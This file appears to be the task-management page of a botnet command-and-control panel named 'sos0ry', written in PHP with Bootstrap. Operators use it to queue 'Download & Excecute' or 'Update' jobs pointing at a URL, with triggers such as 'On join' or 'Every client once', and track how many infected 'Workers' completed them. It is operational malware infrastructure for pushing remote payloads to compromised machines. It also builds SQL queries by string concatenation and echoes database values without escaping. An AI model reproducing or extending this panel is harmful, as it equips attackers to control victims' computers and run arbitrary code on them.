<?php
    session_start();
    if($_SESSION['auth'] != 'true'){
        header("Location: index.php");
        die();
    }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>sos0ry</title>

    <!-- Bootstrap -->

    <link href="css/style_table.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->

    <script src="js/bootstrap.js"></script>
  </head>
    <body>
        
        <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']."\">";
        ?>
        
            <div class="container-fluid">
                <div class="navbar-header">
                <?php
                    include('config.php');
                    $cf = mysql_fetch_assoc(mysql_query("SELECT `color` FROM `userinfo`"));
                    $nick = mysql_fetch_assoc(mysql_query("SELECT `login` FROM `userinfo`"));
                    
                    if($cf['color'] == 'Seller')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #06A0F9;text-shadow: #06A0F9 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Resident')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color:#8A2BE2;text-shadow: #8A2BE2 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Administrator')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: red;text-shadow: red 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Fusked')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #f6f506;text-shadow: #f6f506 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Moderator')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #54E610;text-shadow: #54E610 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Premium')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color:#fbbc00;text-shadow: #fbbc00 1px 1px 10px;font-weight: bold;background: url(http://darkwebs.biz/styles/stuff/images/bggold.gif);\">".$nick['login']."</a>";
                ?>
                </div>
                <ul class="nav navbar-nav">
                <li><a href="table.php">Workers</a></li>
                <li class="active"><a href="tasks.php">Tasks</a></li>
                <li><a href="settings.php">Settings</a></li>
                </ul>
            </div>
        </nav>
        <div class="container">
            <div style="width:30%; margin: 0 auto;">
                <div class="well" style="opacity: 0.9; text-align:center;">
                <h4 style="color: red";>Create task</h4>
                    <form action="cmd.php" method="POST">
                        <div class="form-group">
                            <input type="text" class="form-control" name="name"  placeholder="Name">
                        </div>
                        <div class="form-group">
                            <input type="text" class="form-control" name="url"  placeholder="URL">
                        </div>
                        <div class="form-group">
                            <select class="form-control" name="type" >
                                <option>Update</option>
                                <option>Download & Excecute</option>
                            </select>
                        </div>  
                        <div class="form-group">
                            <select class="form-control" name="trigger" >
                                <option>On join</option>
                                <option>Every client once</option>
                            </select>
                        </div>  
                        <input type="submit" class="btn btn-primary" value="Create">
                    </form>
                 </div>
            </div>
            <table class="table table-hover">
                <thead>
                <tr style="background-color: white; opacity: 0.9;">
                    <th style="color: green;">ID</th>
                    <th style="color: green;">Name</th>
                    <th style="color: green;">Type</th>
                    <th style="color: green;">Trigger</th>
                    <th style="color: green;">URL</th>
                    <th style="color: green;">Completed</th>
                    <th style="color: green;">Status</th>
                    <th style="color: green;">Start/Stop/Delete</th>
                    <th style="color: green;">Action</th>
                </tr>
                </thead>
                <tbody>
                <?php
                include('config.php');

                $tasks = mysql_query("SELECT * FROM `tasks`");
                for($x = 0; $x < mysql_num_rows($tasks); $x++){
                $task = mysql_fetch_assoc($tasks);
                $count = mysql_num_rows(mysql_query("SELECT id FROM `completed` WHERE `taskid`='".$task['id']."'"));
                echo
                "
                <tr style=\"background-color: #FF4500; opacity: 0.9;\">
                    <td>".$task['id']."</td>
                    <td>".$task['name']."</td>
                    <td>".$task['type']."</td>
                    <td>".$task['trigger']."</td>
                    <td>".$task['url']."</td>
                    <td>".$count."</td>
                    <td>".$task['status']."</td>
                    <form action='cmd.php' method='post'>
                    <td>
                        <select name='action' class=\"form-control\">
                            <option style='background-color: green;'>Start</option>
                            <option style='background-color: orange;'>Stop</option>
                            <option style='background-color: red;'>Delete</option>
                        </select>
                        <input type='hidden' name='taskid' value='".$task['id']."'>
                    </td>
                    <td><input type='submit' class=\"btn btn-default\" value='Apply'></td>
                    </form>
                </tr>";
                }
                ?>
                </tbody>
            </table>
        </div>
        <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']." navbar-fixed-bottom\" style='opacity: 0.7'>";
        ?>
        
            <div class="container-fluid">
                <div class="navbar-header">
               <a class="navbar-brand">sos0ry</a>
                </div>
                
            </div>
    </body>
</html>